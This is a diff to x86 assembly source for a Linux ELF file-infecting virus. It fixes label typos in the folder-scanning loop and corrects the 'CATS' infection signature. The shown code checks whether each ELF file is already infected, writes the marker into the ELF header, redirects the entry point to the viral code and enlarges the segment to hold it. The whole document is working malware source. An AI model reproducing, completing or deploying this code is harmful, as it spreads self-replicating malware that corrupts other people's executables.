@@ -12,10 +12,10 @@ fake_space:         ;create fake space in stack
     push 0x00       ; reserve 4 bytes (double word) of 0's
     sub ecx, 1      ; decrement our counter by 1
     cmp ecx, 0
-    jbe loop_bss
+    jbe fake_space
     mov edi, esp    ; esp has our fake .bss offset.  Let's store it in edi for now.
 
-    call folder
+    call scan_folder
     db ".", 0
 
 scan_folder:
@@ -113,7 +113,7 @@ check_elf:
     jnz close_file  ; not an executable ELF binary.  Return
 
     ; check if infected
-    mov ecx, 0x43415453     ; 0x43415453(CATS) signature, the infected marker
+    mov ecx, 0x53544143     ; 0x43415453(CATS) signature, the infected marker
     cmp dword [edi+2080+8], ecx   ; signature should show up after the 8th byte.  edi+2080 is offset to fileContent in fake .bss
     jz close_file                   ; signature exists.  Already infected.  Close file.
 
@@ -215,7 +215,7 @@ program_header_loop:
     mov ebx, dword [edi+2080+eax+8]     ; phdr->vaddr (virtual address in memory)
     add ebx, edx        ; new entry point = phdr[data]->vaddr + p[data]->filesz
 
-    mov ecx, 0x001edd0e     ; insert our signature at byte 8 (unused section of the ELF header)
+    mov ecx, 0x53544143     ; insert our signature at byte 8 (unused section of the ELF header)
     mov [edi+2080+8], ecx
     mov [edi+2080+24], ebx  ; overwrite the old entry point with the virus (in buffer)
     add edx, v_stop - v_start   ; add size of our virus to phdr->filesz
